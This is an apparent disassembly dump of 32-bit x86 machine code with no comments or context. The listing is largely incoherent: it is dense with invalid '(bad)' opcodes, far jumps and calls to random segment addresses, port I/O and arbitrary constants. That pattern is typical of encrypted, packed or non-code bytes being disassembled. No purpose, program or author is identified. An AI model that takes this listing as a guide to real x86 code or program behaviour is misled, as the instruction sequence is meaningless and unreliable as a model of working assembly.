  417b4f:	adc    DWORD PTR [ecx+eax*4+0x5e840aa6],esp
  417b56:	clc    
  417b57:	int    0x63
  417b59:	mov    eax,0xbe2c7703
  417b5e:	test   al,0xc2
  417b60:	jno    0x417b86
  417b62:	dec    edi
  417b63:	mov    ss,WORD PTR [ecx+0x2e1544a5]
  417b69:	shr    DWORD PTR [ebx-0x51860a00],cl
  417b6f:	sub    esp,edi
  417b71:	rcr    BYTE PTR [eax],1
  417b73:	int3   
  417b74:	mov    cl,0x38
  417b76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417b77:	mov    bl,0x9d
  417b79:	cmp    bl,BYTE PTR [esp+ebp*2-0x55]
  417b7d:	inc    esi
  417b7e:	(bad)  
  417b7f:	fstp   DWORD PTR [edi]
  417b81:	mov    ah,0x90
  417b83:	xor    eax,0x9207531f
  417b88:	xchg   esp,eax
  417b89:	jge    0x417b99
  417b8b:	aam    0x48
  417b8d:	repnz scas al,BYTE PTR es:[edi]
  417b8f:	or     BYTE PTR [ebx],0x6c
  417b92:	retf   
  417b93:	or     ecx,esi
  417b95:	jmp    0x1f71:0x1ced926f
  417b9c:	ret    0xdefa
  417b9f:	mov    dh,0x6
  417ba1:	and    ebx,DWORD PTR [ebx-0x1d3fd7e5]
  417ba7:	push   es
  417ba8:	pop    eax
  417ba9:	fdiv   st(2),st
  417bab:	mov    edi,0x5b07f54f
  417bb0:	scas   al,BYTE PTR es:[edi]
  417bb1:	xor    cl,BYTE PTR [edi-0x2b]
  417bb4:	jno    0x417b50
  417bb6:	mov    ah,0xa8
  417bb8:	cmp    ch,ch
  417bba:	lods   eax,DWORD PTR ds:[esi]
  417bbb:	mov    ds:0x46dc18de,al
  417bc0:	mov    DWORD PTR [ebx-0x1f],ecx
  417bc3:	(bad)  
  417bc4:	xor    esi,esp
  417bc6:	mov    edi,0x67320042
  417bcb:	adc    eax,0x461177f8
  417bd0:	lahf   
  417bd1:	xor    esp,esp
  417bd3:	icebp  
  417bd4:	add    esi,edx
  417bd6:	inc    edi
  417bd7:	and    BYTE PTR [edx],ch
  417bd9:	arpl   WORD PTR ds:0xeb756eaf,sp
  417bdf:	adc    al,0x6c
  417be1:	loope  0x417bcc
  417be3:	pop    ebp
  417be4:	xor    al,0xdd
  417be6:	adc    eax,0xb59d4037
  417beb:	and    DWORD PTR [ecx],ecx
  417bed:	xor    BYTE PTR [eax-0x6118ba07],0x69
  417bf4:	push   ds
  417bf5:	arpl   ax,di
  417bf7:	mov    edi,0xbef73c8f
  417bfc:	dec    esp
  417bfd:	add    al,ah
  417bff:	outs   dx,BYTE PTR ds:[esi]
  417c00:	sub    al,0x7b
  417c02:	xor    BYTE PTR [ebx],cl
  417c04:	inc    eax
  417c05:	aam    0x9c
  417c07:	aam    0x76
  417c09:	out    0xd3,al
  417c0b:	fild   QWORD PTR ds:0x41e37902
  417c11:	cmp    DWORD PTR [edi+0x6917f4f6],esi
  417c17:	mov    bh,0x7f
  417c19:	xor    al,0x5
  417c1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417c1c:	rcr    ebx,cl
  417c1e:	in     eax,0x9e
  417c20:	and    BYTE PTR [ecx-0x28460f88],cl
  417c26:	daa    
  417c27:	test   ebp,ebx
  417c29:	jg     0x417c37
  417c2b:	mov    DWORD PTR [ebx+0x34603759],ebx
  417c31:	pop    ebx
  417c32:	sub    eax,0x4bc96303
  417c37:	add    al,0x5d
  417c39:	push   edi
  417c3a:	push   cs
  417c3b:	cmp    ah,BYTE PTR [esi]
  417c3d:	inc    esi
  417c3e:	retf   
  417c3f:	clc    
  417c40:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417c41:	ds pop esi
  417c43:	jecxz  0x417c5a
  417c45:	ret    0xd0da
  417c48:	ret    
  417c49:	dec    edx
  417c4a:	test   eax,0xb9e9b07a
  417c4f:	(bad)  
  417c50:	pop    esp
  417c51:	cmp    ecx,ebx
  417c53:	mov    esi,0xcbc926e3
  417c58:	(bad)  [ecx-0x9]
  417c5b:	into   
  417c5c:	retf   0x93b5
  417c5f:	lock pop ebp
  417c61:	shl    cl,cl
  417c63:	ret    0xa728
  417c66:	lea    esi,ds:0xe285f214
  417c6c:	jb     0x417bfa
  417c6e:	fstp   TBYTE PTR [edx]
  417c70:	(bad)  
  417c72:	or     cl,ah
  417c74:	xor    eax,DWORD PTR [eax+ebp*1-0x2f049e28]
  417c7b:	ins    DWORD PTR es:[edi],dx
  417c7c:	jmp    0x9042:0xe22e739f
  417c83:	pop    esp
  417c84:	(bad)  
  417c85:	xor    ah,0x82
  417c88:	pop    ss
  417c89:	dec    edi
  417c8a:	xchg   edi,eax
  417c8b:	stos   DWORD PTR es:[edi],eax
  417c8c:	mov    edi,0xb256e21b
  417c91:	out    0x33,eax
  417c93:	lods   eax,DWORD PTR ds:[esi]
  417c94:	ret    
  417c95:	imul   ebp,DWORD PTR [edi+0x439ca7ad],0xfffffffa
  417c9c:	jo     0x417d19
  417c9e:	cmp    ecx,ecx
  417ca0:	js     0x417c51
  417ca2:	shl    DWORD PTR [edx-0x20],cl
  417ca5:	int    0x86
  417ca7:	mov    ?,WORD PTR [ebx]
  417ca9:	xchg   ebp,eax
  417caa:	mov    BYTE PTR [eax+0x2f051cec],dh
  417cb0:	cmp    dl,bh
  417cb2:	test   DWORD PTR [esp+eiz*2-0x57e97f6],edx
  417cb9:	rcl    eax,1
  417cbb:	and    eax,0xf4d06c31
  417cc0:	or     al,0x13
  417cc2:	and    al,0x4c
  417cc4:	mov    esi,0x220fd833
  417cc9:	ret    0xa5f6
  417ccc:	jl     0x417c63
  417cce:	push   esi
  417ccf:	pop    ebp
  417cd0:	gs cmp al,0xce
  417cd3:	push   0x23688d68
  417cd8:	loope  0x417ce6
  417cda:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417cdb:	inc    DWORD PTR [edx-0x68a8eeb5]
  417ce1:	xor    eax,0xef527f5b
  417ce6:	addr16 out dx,al
  417ce8:	fcomp  QWORD PTR [ecx+0x51490ffd]
  417cee:	inc    ebp
  417cef:	mov    dl,0x16
  417cf1:	cmp    BYTE PTR [esp+edi*1+0x78],cl
  417cf5:	xchg   ebp,eax
  417cf6:	or     eax,0xb02f1a58
  417cfb:	adc    eax,0xfa256311
  417d00:	pop    ss
  417d01:	pop    ss
  417d02:	xor    dl,dl
  417d04:	dec    edx
  417d05:	call   0x4161e23
  417d0a:	push   esp
  417d0b:	mov    ah,0x97
  417d0d:	loop   0x417c94
  417d0f:	jecxz  0x417cd6
  417d11:	test   eax,0xb03f769f
  417d16:	add    dl,al
  417d18:	mov    ch,0x77
  417d1a:	clc    
  417d1b:	jns    0x417d1e
  417d1d:	leave  
  417d1e:	and    al,0xc9
  417d20:	lods   eax,DWORD PTR ds:[esi]
  417d21:	in     eax,dx
  417d22:	push   ebx
  417d23:	das    
  417d24:	loope  0x417d65
  417d26:	push   0xffffffb6
  417d28:	test   eax,0xd2c78933
  417d2d:	jbe    0x417d8e
  417d2f:	enter  0x4919,0xa2
  417d33:	jnp    0x417ce5
  417d35:	repnz ds xchg edx,esp
  417d39:	popa   
  417d3a:	add    BYTE PTR [ebx-0x10160923],ch
  417d40:	icebp  
  417d41:	push   esp
  417d42:	inc    esp
  417d43:	xchg   edi,eax
  417d44:	jns    0x417cef
  417d46:	enter  0x17b8,0xba
  417d4a:	cmc    
  417d4b:	popf   
  417d4c:	xchg   esp,eax
  417d4d:	gs cwde 
  417d4f:	sbb    eax,0xaecfdeb2
  417d54:	in     eax,0x51
  417d56:	or     BYTE PTR [edi+0x533e6bd7],bh
  417d5c:	mov    ch,0xcf
  417d5e:	(bad)  
  417d5f:	cmp    DWORD PTR [eax+0x280bc9b4],ecx
  417d65:	out    0x44,al
  417d67:	or     BYTE PTR [ebx],bh
  417d69:	fwait
  417d6a:	mov    BYTE PTR [edx],0x88
  417d6d:	or     al,0xb2
  417d6f:	(bad)  
  417d70:	jnp    0x417db5
  417d72:	jmp    0x44830814
  417d77:	dec    esi
  417d78:	jge    0x417d5c
  417d7a:	or     DWORD PTR [edx],edx
  417d7c:	test   eax,0x198fede5
  417d81:	add    eax,0xb6c493ac
  417d86:	(bad)  
  417d87:	sub    al,0xab
  417d89:	(bad)  
  417d8c:	dec    ebp
  417d8d:	push   esi
  417d8e:	xchg   BYTE PTR [eax-0x2611ff9e],bl
  417d94:	jg     0x417d56
  417d96:	shr    BYTE PTR [edx-0x30],1
  417d99:	cld    
  417d9a:	mov    eax,DWORD PTR [esi+0x1c897031]
  417da0:	in     al,0x67
  417da2:	cmc    
  417da3:	aaa    
  417da4:	mov    al,ds:0x8950d418
  417da9:	and    eax,0x32434779
  417dae:	dec    esp
  417daf:	sub    ebx,ebx
  417db1:	js     0x417dcf
  417db3:	jge    0x417ddd
  417db5:	push   ebx
  417db6:	sar    BYTE PTR [ebx+0x48],0xf9
  417dba:	add    DWORD PTR [ecx+0x13],esp
  417dbd:	push   es
  417dbe:	retf   0xca27
  417dc1:	fisubr WORD PTR [esi-0x12]
  417dc4:	add    DWORD PTR [esi-0x3a],0xffffffe9
  417dc8:	(bad)  
  417dc9:	icebp  
  417dca:	jmp    0x417deb
  417dcc:	sbb    dl,dl
  417dce:	stos   DWORD PTR es:[edi],eax
  417dcf:	icebp  
  417dd0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417dd1:	std    
  417dd2:	int3   
  417dd3:	daa    
  417dd4:	shl    DWORD PTR [ebx+0x231568c9],1
  417dda:	add    al,0x69
  417ddc:	xchg   ecx,eax
  417ddd:	(bad)  
  417dde:	jp     0x417de6
  417de0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417de1:	lock sub esi,DWORD PTR [esi-0x26]
  417de5:	mov    esp,DWORD PTR [edi+eiz*8]
  417de8:	xchg   ecx,eax
  417de9:	jecxz  0x417d73
  417deb:	mov    dh,0x58
  417ded:	icebp  
  417dee:	pop    ebp
  417def:	imul   ebp,edi,0xffffffba
  417df2:	(bad)  [edi+0x37]
  417df5:	call   0x819b:0x173b13cf
  417dfc:	cmp    BYTE PTR [ebx],ah
  417dfe:	cs int 0x5c
  417e01:	add    dh,bh
  417e03:	in     al,0xde
  417e05:	pop    ecx
  417e06:	test   DWORD PTR [ebx+ecx*2-0x1f],0x6236cd90
  417e0e:	mov    cl,0x3d
  417e10:	fdivr  QWORD PTR [esi+0x3f7b000c]
  417e16:	mov    edi,0xc6371f7b
  417e1b:	jl     0x417e3b
  417e1d:	pop    esp
  417e1e:	in     al,0x18
  417e20:	rol    ah,0xca
  417e23:	cmp    dl,BYTE PTR [edx+ebp*2]
  417e26:	call   0x8d2d:0x517110de
  417e2d:	xchg   ebx,eax
  417e2e:	addr16 xchg edx,eax
  417e30:	ins    BYTE PTR es:[edi],dx
  417e31:	jbe    0x417df0
  417e33:	pushf  
  417e34:	sub    ecx,esp
  417e36:	pop    edx
  417e37:	ror    DWORD PTR [esi],1
  417e39:	mov    fs,WORD PTR [ecx+0x7faeaf31]
  417e3f:	aam    0x66
  417e41:	sbb    al,0x29
  417e43:	or     al,0x68
  417e45:	and    DWORD PTR ds:0xb204f174,esi
  417e4b:	xchg   esp,eax
  417e4c:	dec    esi
  417e4d:	fdivrp st(1),st
  417e4f:	sbb    esi,0x43b04013
  417e55:	jl     0x417e2f
  417e57:	and    edi,0xe4eb8bf6
  417e5d:	mov    ah,0x0
  417e5f:	mov    al,0x1
  417e61:	into   
  417e62:	jge    0x417e94
  417e64:	inc    esp
  417e65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417e66:	ins    DWORD PTR es:[edi],dx
  417e67:	fsubr  QWORD PTR [eax+0x3ff37b4]
  417e6d:	sub    DWORD PTR [ebp-0x1ea11a5],esi
  417e73:	dec    eax
  417e74:	adc    bl,0x3f
  417e77:	fst    st(4)
  417e79:	and    DWORD PTR [esi],esp
  417e7b:	ds jmp 0x8fff4238
  417e81:	or     eax,0x69dc2123
  417e86:	ins    DWORD PTR es:[edi],dx
  417e87:	(bad)  
  417e88:	push   esi
  417e89:	pop    ebp
  417e8a:	sbb    ch,0x45
  417e8d:	add    BYTE PTR [ebx-0x3e],bl
  417e90:	or     eax,DWORD PTR [ebx]
  417e92:	sbb    al,0xf2
  417e94:	push   ds
  417e95:	xchg   esi,eax
  417e96:	mov    bl,0xd
  417e98:	neg    DWORD PTR [edi]
  417e9a:	sub    ah,BYTE PTR [edi+0x26]
  417e9d:	xchg   ebx,eax
  417e9e:	call   0xce82bd86
  417ea3:	or     BYTE PTR [ecx-0x69e30da7],ch
  417ea9:	out    0xc6,al
  417eab:	or     edx,ecx
  417ead:	call   0x9c04:0x44c8531b
  417eb4:	pop    ss
  417eb5:	dec    ebp
  417eb6:	std    
  417eb7:	jmp    0x7221:0xd00918b6
  417ebe:	dec    esi
  417ebf:	add    eax,0xb042a128
  417ec4:	push   0x8
  417ec6:	adc    ah,BYTE PTR [eax+0x21]
  417ec9:	es pop esi
  417ecb:	mov    ch,0x7b
  417ecd:	es fsubrp st(4),st
  417ed0:	xchg   DWORD PTR [edi+0x77b350ed],edx
  417ed6:	adc    DWORD PTR [eax-0x48],0x6
  417eda:	push   ds
  417edb:	xchg   ecx,eax
  417edc:	jo     0x417f30
  417ede:	add    ebx,esp
  417ee0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417ee1:	repz pop ebx
  417ee3:	or     al,0x1c
  417ee5:	aas    
  417ee6:	lock push ecx
  417ee8:	outs   dx,BYTE PTR ds:[esi]
  417ee9:	sbb    dl,bl
  417eeb:	xor    ch,BYTE PTR [esp+esi*4+0x7b353b38]
  417ef2:	nop
  417ef3:	out    dx,eax
  417ef4:	shl    DWORD PTR [ebp+eax*4-0x15],0x0
  417ef9:	outs   dx,DWORD PTR ds:[esi]
  417efa:	mov    DWORD PTR [esi],edi
  417efc:	les    edi,FWORD PTR [ebp+ebx*8+0x47]
  417f00:	mov    WORD PTR [ecx+0x6e],fs
  417f03:	push   ss
  417f04:	aas    
  417f05:	ret    
  417f06:	ret    
  417f07:	aas    
  417f08:	repnz push ds
  417f0a:	sub    BYTE PTR [edx],bl
  417f0c:	lock out dx,al
  417f0e:	push   cs
  417f0f:	mov    ah,0x7b
  417f11:	pop    edi
  417f12:	push   0xffffffe7
  417f14:	daa    
  417f15:	addr16 leave 
  417f17:	(bad)  
  417f18:	pushf  
  417f19:	lods   eax,DWORD PTR ds:[esi]
  417f1a:	sub    cl,cl
  417f1c:	or     dl,bl
  417f1e:	pop    ebx
  417f1f:	pop    es
  417f20:	sbb    BYTE PTR [ecx+0x1c0351a],0x15
  417f27:	pop    edx
  417f28:	aaa    
  417f29:	sbb    edx,DWORD PTR [edi+edi*4]
  417f2c:	daa    
  417f2d:	or     eax,0x5d486e0d
  417f32:	into   
  417f33:	xchg   ecx,eax
  417f34:	push   edi
  417f35:	and    eax,0xa46dd0e2
  417f3a:	loop   0x417f31
  417f3c:	ins    BYTE PTR es:[edi],dx
  417f3d:	cmp    esi,DWORD PTR [ebx-0x5da372da]
  417f43:	iret   
  417f44:	aas    
  417f45:	xchg   ecx,eax
  417f46:	ror    bh,1
  417f48:	mov    ch,0xff
  417f4a:	inc    ebx
  417f4b:	push   ecx
  417f4c:	jmp    0x417f6b
  417f4e:	es icebp 
  417f50:	add    dl,BYTE PTR [ebx-0x777bbc70]
  417f56:	fcomp  st(0)
  417f58:	adc    esi,esp
  417f5a:	sbb    ah,BYTE PTR [ecx]
  417f5c:	add    bh,BYTE PTR [esi]
  417f5e:	sar    DWORD PTR [edi],1
  417f60:	fwait
  417f61:	push   esi
  417f62:	push   0xa78fdb4a
  417f67:	xor    cl,BYTE PTR [edx+0x69bc1d90]
  417f6d:	test   DWORD PTR [esi-0x16],0x76b852c0
  417f74:	xchg   edi,eax
  417f75:	cmp    eax,0xcca9cd83
  417f7a:	shl    BYTE PTR [esi],1
  417f7c:	pop    es
  417f7d:	aas    
  417f7e:	repnz in eax,0xc6
  417f81:	lods   eax,DWORD PTR ds:[esi]
  417f82:	inc    eax
  417f83:	mov    ebx,0x994a21d5
  417f88:	leave  
  417f89:	adc    BYTE PTR [ebx],0x7e
  417f8c:	in     eax,dx
  417f8d:	inc    ecx
  417f8e:	mov    edx,esp
  417f90:	cmp    eax,0x4bd1e0e7
  417f95:	inc    ebp
  417f96:	push   ss
  417f97:	inc    ebp
  417f98:	sbb    al,0x4f
  417f9a:	shr    DWORD PTR [ecx+0x55],0xd1
  417f9e:	adc    BYTE PTR [ecx+0x5d],ch
  417fa1:	mov    dh,0x12
  417fa3:	stos   BYTE PTR es:[edi],al
  417fa4:	rcr    BYTE PTR [ebp+0x58],1
  417fa7:	test   esi,ebx
  417fa9:	pop    ds
  417faa:	push   esi
  417fab:	dec    edx
  417fac:	mov    al,ds:0x3c5418c6
  417fb1:	xchg   edi,eax
  417fb2:	jle    0x417f52
  417fb4:	rol    cl,0xaa
  417fb7:	and    DWORD PTR [esi+0xb5f5e8d],esp
  417fbd:	dec    eax
  417fbe:	or     al,0x9d
  417fc0:	loopne 0x41800d
  417fc2:	adc    ch,dh
  417fc4:	dec    ebp
  417fc5:	or     edx,DWORD PTR [esi+edx*4-0x2e9b2be7]
  417fcc:	push   ecx
  417fcd:	xchg   edx,eax
  417fce:	scas   eax,DWORD PTR es:[edi]
  417fcf:	int3   
  417fd0:	scas   eax,DWORD PTR es:[edi]
  417fd1:	fnsave [ecx]
  417fd3:	xlat   BYTE PTR ds:[ebx]
  417fd4:	fwait
  417fd5:	into   
  417fd6:	mov    DWORD PTR [esp+eax*2+0x3e],edx
  417fda:	sti    
  417fdb:	jmp    0x4242aa03
  417fe0:	cwde   
  417fe1:	stos   BYTE PTR es:[edi],al
  417fe2:	call   0x6ce6:0x970b9972
  417fe9:	iret   
  417fea:	mov    eax,0x650571fb
  417fef:	arpl   WORD PTR [ebp+0x63],ax
  417ff2:	out    0x36,al
  417ff4:	arpl   WORD PTR [esi+ebx*1],bx
  417ff7:	or     eax,0x5c5ce93d
  417ffc:	mov    edi,0x173b7b2a
  418001:	pushf  
  418002:	pop    eax
  418003:	out    dx,eax
  418004:	jae    0x418002
  418006:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418008:	or     al,0x41
  41800a:	sub    DWORD PTR [ebx+0x6b6372f7],eax
  418010:	in     al,dx
  418011:	out    dx,al
  418012:	cmc    
  418013:	mov    dl,0x37
  418015:	(bad)  
  418016:	cmp    dh,BYTE PTR [edi+ebx*1-0x24]
  41801a:	fist   DWORD PTR [esi+0x2f38cf]
  418020:	dec    esi
  418021:	jo     0x417fe5
  418023:	fucomp st(2)
  418025:	pop    edx
  418026:	jl     0x417fba
  418028:	mov    dh,0xa6
  41802a:	cld    
  41802b:	test   DWORD PTR [edx-0x3b7ac1ee],edx
  418031:	pop    ss
  418032:	in     al,0x84
  418034:	push   0x3f0a8d49
  418039:	adc    ecx,DWORD PTR [eax+0x7]
  41803c:	imul   cx,WORD PTR [ebx-0x2c1c34de],0x5905
  418045:	sub    dl,0x9f
  418048:	xor    DWORD PTR [ebx-0x16351ee6],eax
  41804e:	adc    esp,DWORD PTR [ecx-0x45]
  418051:	je     0x418085
  418053:	sub    bl,ah
  418055:	sbb    al,0x13
  418057:	add    DWORD PTR [ebx+0x15c6cbdb],eax
  41805d:	(bad)  
  41805e:	mov    ebp,0x90cc562b
  418063:	inc    ebp
  418064:	xor    BYTE PTR [eax+0x1e82c42a],dl
  41806a:	or     eax,0x228d491b
  41806f:	jne    0x418021
  418071:	std    
  418072:	mov    cl,0x84
  418074:	mov    al,0xe5
  418076:	loop   0x41801e
  418078:	xor    eax,0x36a75e6d
  41807d:	jb     0x418057
  41807f:	(bad)  
  418080:	shl    BYTE PTR [edx-0x1b29a323],0xa
  418087:	adc    bl,ch
  418089:	xor    edi,ebx
  41808b:	adc    al,dl
  41808d:	lods   eax,DWORD PTR ds:[esi]
  41808e:	ins    DWORD PTR es:[edi],dx
  41808f:	jns    0x41806e
  418091:	ret    
  418092:	ret    
  418093:	sub    dh,BYTE PTR [edi]
  418095:	cmp    esp,DWORD PTR [edx+0x49fc5d84]
  41809b:	mov    ebx,0xee082a1f
  4180a0:	ret    0xbe25
  4180a3:	pop    ss
  4180a4:	xor    ebx,eax
  4180a6:	add    eax,0x9585166b
  4180ab:	loope  0x4180d7
  4180ad:	pop    edx
  4180ae:	adc    eax,0xd10fb1e7
  4180b3:	push   ds
  4180b4:	inc    DWORD PTR [ebx-0x4c]
  4180b7:	je     0x4180de
  4180b9:	mov    edi,0x9a281c22
  4180be:	inc    ebx
  4180bf:	pop    es
  4180c0:	(bad)  
  4180c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4180c2:	mov    ebp,0x5f2a4ed3
  4180c7:	jmp    0xe22b0bc3
  4180cc:	add    dh,BYTE PTR [edi]
  4180ce:	mov    ecx,0xfa005665
  4180d3:	jge    0x41805c
  4180d5:	stos   BYTE PTR es:[edi],al
  4180d6:	adc    al,0xf
  4180d8:	mov    bl,0x29
  4180da:	mov    ah,0x72
  4180dc:	sbb    esp,DWORD PTR [eax-0x55386a16]
  4180e2:	mov    eax,ds:0x16ab3665
  4180e7:	sub    eax,0xd62de924
  4180ec:	rcl    BYTE PTR [edi+0x59],cl
  4180ef:	xlat   BYTE PTR ds:[ebx]
  4180f0:	loopne 0x4180dd
  4180f2:	jge    0x4180f0
  4180f4:	test   esi,esp
  4180f6:	xchg   ecx,eax
  4180f7:	aad    0x33
  4180f9:	(bad)  
  4180fa:	mov    eax,ds:0xa4a0a12
  4180ff:	pop    ds
  418100:	scas   eax,DWORD PTR es:[edi]
  418101:	fcomp  QWORD PTR [edx]
  418103:	xchg   ecx,eax
  418104:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418105:	nop
  418106:	sub    ebx,DWORD PTR [ebx+0x32bf6ac3]
  41810c:	into   
  41810d:	fcom   QWORD PTR [esi]
  41810f:	jne    0x41816c
  418111:	aaa    
  418112:	add    DWORD PTR [esi-0x403fd84],esi
  418118:	xor    DWORD PTR [edx],edx
  41811a:	aas    
  41811b:	leave  
  41811c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41811d:	ret    0x2dff
  418120:	call   0xad6b:0xe3c051b
  418127:	cld    
  418128:	mov    ds:0xa04b377,eax
  41812d:	inc    ecx
  41812e:	cmp    al,0x31
  418130:	pop    ebx
  418131:	jg     0x418182
  418133:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418134:	mov    ds:0xa261f7d4,eax
  418139:	push   ds
  41813a:	shl    DWORD PTR [ecx-0x2df20d66],1
  418140:	jne    0x418198
  418142:	pop    ecx
  418143:	mov    ch,0x62
  418145:	sub    DWORD PTR [eax+0x7088cc47],0x1e
  41814c:	loop   0x418179
  41814e:	sub    al,0x2a
  418150:	xchg   esi,eax
  418151:	add    BYTE PTR [ebp-0x76b484da],cl
  418157:	ror    esi,1
  418159:	std    
  41815a:	pop    es
  41815b:	inc    esi
  41815c:	dec    BYTE PTR [esi]
  41815e:	lds    eax,FWORD PTR [eax+eiz*2+0x2]
  418162:	jmp    0x9177d221
  418167:	ret    0x8059
  41816a:	test   esi,esp
  41816c:	jle    0x41818d
  41816e:	xor    eax,0x247ea4d1
  418173:	dec    eax
  418174:	or     edx,DWORD PTR [ecx]
  418176:	call   0x47a4:0x2b5dacb0
  41817d:	pop    esp
  41817e:	cmp    al,0x4a
  418180:	int    0x4c
  418182:	xchg   ah,cl
  418184:	loopne 0x4181b5
  418186:	repz adc esi,DWORD PTR [eax+0x63]
  41818a:	jno    0x4181dc
  41818c:	jno    0x418188
  41818e:	jnp    0x4181f2
  418190:	call   DWORD PTR [ebx-0x42aad22a]
  418196:	mov    edx,0x96e05083
  41819b:	test   DWORD PTR [esp+edx*2+0x1],esp
  41819f:	outs   dx,BYTE PTR ds:[esi]
  4181a0:	pop    es
  4181a1:	pop    ecx
  4181a2:	inc    esp
  4181a3:	retf   0xb17a
  4181a6:	add    eax,0xa4384b50
  4181ab:	loopne 0x4181d6
  4181ad:	inc    esp
  4181ae:	(bad)  
  4181af:	cmp    ecx,DWORD PTR [esi+0x3709c8ed]
  4181b5:	das    
  4181b6:	(bad)  
  4181b7:	cwde   
  4181b8:	inc    ebp
  4181b9:	arpl   WORD PTR [edi-0x5186f082],ax
  4181bf:	fld    st(4)
  4181c1:	xchg   ecx,eax
  4181c3:	cs cld 
  4181c5:	inc    ecx
  4181c6:	gs mov edx,0x9f5ff181
  4181cc:	in     al,dx
  4181cd:	in     al,0x63
  4181cf:	jge    0x418206
  4181d1:	(bad)  
  4181d2:	fstp   DWORD PTR [edx+0x73ee6ced]
  4181d8:	or     dh,ch
  4181da:	sub    ebx,edi
  4181dc:	cld    
  4181dd:	pop    ecx
  4181de:	les    esp,FWORD PTR [ecx+0x79]
  4181e1:	(bad)  
  4181e3:	cli    
  4181e4:	xor    DWORD PTR [ebx-0x25],esi
  4181e7:	int3   
  4181e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4181e9:	js     0x4181d9
  4181eb:	outs   dx,BYTE PTR ds:[esi]
  4181ec:	fcomp  st(1)
  4181ee:	xlat   BYTE PTR ds:[ebx]
  4181ef:	pop    ecx
  4181f0:	jmp    0xdee107e9
  4181f5:	adc    ebp,edx
  4181f7:	imul   edx,DWORD PTR [ebp+0x5610dce8],0xb
  4181fe:	call   0x30e796cd
  418203:	fcom   DWORD PTR [ebp+0x5ff499a3]
  418209:	pushf  
  41820a:	sub    BYTE PTR [edi-0x703fb58f],ah
  418210:	xchg   ecx,eax
  418211:	jecxz  0x418206
  418213:	mov    esp,0x15dd9ca3
  418218:	stc    
  418219:	jne    0x418275
  41821b:	push   edi
  41821c:	inc    eax
  41821d:	sub    edi,esi
  41821f:	push   ecx
  418220:	push   edi
  418221:	mov    eax,ds:0x6476901d
  418226:	jnp    0x4181cb
  418228:	sbb    bh,0x9d
  41822b:	sbb    ecx,DWORD PTR [ebx+0x73166192]
  418231:	mov    al,0xc1
  418233:	mov    esi,0x3948967e
  418238:	lds    edx,FWORD PTR [ecx]
  41823a:	pop    esi
  41823b:	fadd   st,st(2)
  41823d:	pop    es
  41823e:	push   es
  41823f:	pop    ss
  418240:	pop    esp
  418241:	pop    ebp
  418242:	es push ebx
  418244:	repz mov ebp,0xf1aabf7a
  41824a:	jl     0x41828e
  41824c:	dec    edi
  41824d:	sub    ecx,DWORD PTR [eax-0xa]
  418250:	es dec edx
  418252:	mul    BYTE PTR [eax]
  418254:	es pusha 
  418256:	inc    esp
  418257:	call   0x5eb67fa8
  41825c:	call   0x27db077d
  418261:	int3   
  418262:	xor    edx,esp
  418264:	sbb    DWORD PTR [edx+0x65],esi
  418267:	aam    0x97
  418269:	sbb    al,0xce
  41826b:	(bad)  
  41826c:	sub    ebx,ecx
  41826e:	mov    DWORD PTR [edi-0x7516c50f],edx
  418274:	push   esi
  418275:	push   0x7b
  418277:	js     0x4182de
  418279:	add    eax,0xc36559f0
  41827e:	(bad)  [esi+0x3406441c]
  418284:	mov    eax,ds:0xef1d30c2
  418289:	mov    ebx,DWORD PTR [eax]
  41828b:	mov    esp,ecx
  41828d:	push   ebp
  41828e:	out    dx,al
  41828f:	lods   eax,DWORD PTR ds:[esi]
  418290:	push   esp
  418291:	imul   ebp,DWORD PTR [eax],0xbcfa73ff
  418297:	sub    eax,0xa9aedfda
  41829c:	daa    
  41829d:	mov    esp,DWORD PTR [ecx-0x4c]
  4182a0:	(bad)  
  4182a2:	add    al,0x35
  4182a4:	mov    al,0x69
  4182a6:	hlt    
  4182a7:	pop    ecx
  4182a8:	std    
  4182a9:	lahf   
  4182aa:	inc    ebx
  4182ab:	push   eax
  4182ac:	mov    bh,0xde
  4182ae:	leave  
  4182af:	mov    gs,ebp
  4182b1:	sbb    eax,DWORD PTR [esi+0x76bf7310]
  4182b7:	fisttp WORD PTR [edx+esi*2]
  4182ba:	fs ss mov esi,0xb751d8fc
  4182c1:	mov    al,ds:0x8d9e52a6
  4182c6:	nop
  4182c7:	mov    dl,0x9f
  4182c9:	cmp    ch,BYTE PTR [ebp-0x9]
  4182cc:	cwde   
  4182cd:	iret   
  4182ce:	out    dx,al
  4182cf:	mov    ds:0x1fbf23a1,eax
  4182d4:	dec    eax
  4182d5:	fisubr WORD PTR [ecx+0x7f48d4a5]
  4182db:	inc    edi
  4182dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4182de:	pop    ebp
  4182df:	mov    ?,WORD PTR [esi+0x6b]
  4182e2:	xchg   ecx,eax
  4182e3:	mov    ds:0xfb2ef5a3,al
  4182e8:	fsubp  st(4),st
  4182ea:	adc    BYTE PTR [edx-0x2ce02f2e],cl
  4182f0:	pop    ebx
  4182f1:	je     0x418322
  4182f3:	retf   0xebb7
  4182f6:	cmp    BYTE PTR [ecx],cl
  4182f8:	or     al,0x50
  4182fa:	lods   al,BYTE PTR ds:[esi]
  4182fb:	mov    DWORD PTR [eax+0x30],esi
  4182fe:	jns    0x418329
  418300:	xchg   esi,eax
  418301:	fnstcw WORD PTR [ebp-0x55]
  418304:	(bad)  
  418306:	movntq (bad),mm5
  418307:	out    0xee,eax
  418309:	or     eax,0xe32cf271
  41830e:	idiv   DWORD PTR [ecx]
  418310:	mov    cl,0xed
  418312:	popf   
  418313:	push   esp
  418314:	fsubr  st(5),st
  418316:	jl     0x4182ea
  418318:	mov    dh,0x39
  41831a:	(bad)  
  41831b:	aad    0x29
  41831d:	outs   dx,BYTE PTR ds:[esi]
  41831e:	test   al,0x57
  418320:	jge    0x4182db
